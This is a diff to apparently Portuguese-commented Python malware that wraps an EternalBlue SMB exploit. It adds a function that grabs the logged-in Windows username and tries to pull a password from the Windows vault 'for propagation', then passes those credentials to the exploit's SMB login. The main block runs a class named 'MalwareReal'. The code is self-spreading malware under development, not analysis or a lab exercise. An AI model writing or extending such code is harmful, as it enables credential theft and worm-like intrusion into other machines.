@@ -266,6 +266,32 @@ conn.get_socket().close()
 # ===================================================================================================================================
 # 											Eternal Blue
 # ===================================================================================================================================
+
+def get_smb_credentials():
+    """Obtém credenciais para autenticação SMB de forma segura"""
+    try:
+        # Tenta usar as credenciais do Windows primeiro
+        username = os.getenv('USERNAME') or getpass.getuser()
+        
+        # Tenta recuperar senha do vault do Windows
+        from vault_utils import get_windows_password  # Você precisa criar esta função
+        password = get_windows_password("SMB_Credentials")
+        
+        if not password:
+            # Fallback para entrada manual (em modo interativo)
+            if sys.stdin.isatty():  # Só pergunta se estiver em terminal
+                print("Credenciais SMB necessárias para propagação:")
+                password = getpass.getpass(f"Senha para {username}: ")
+            else:
+                # Modo não interativo, usa credencial padrão ou hash
+                password = ""
+        
+        return username, password
+        
+    except Exception:
+        # Fallback extremo
+        return "Guest", ""
+
 def is_admin():
     """Verifica se o script está sendo executado como administrador"""
     try:
@@ -700,7 +726,8 @@ def exploit(target, shellcode, numGroomConn):
     try:
         # Tenta usar autenticação integrada do Windows
         conn = MYSMB(target, use_ntlmv2=True)
-        conn.login(USERNAME, PASSWORD, domain='', lmhash='', nthash='')
+        username, password = get_smb_credentials()
+		conn.login(username, password, domain='', lmhash='', nthash='')
     except Exception as e:
         print(f"Falha no login com credenciais do Windows: {e}")
         # Fallback para autenticação manual se necessário
@@ -2036,6 +2063,7 @@ if __name__ == "__main__":
         pass
     malware = MalwareReal()
     malware.execute()
+
 
 
 
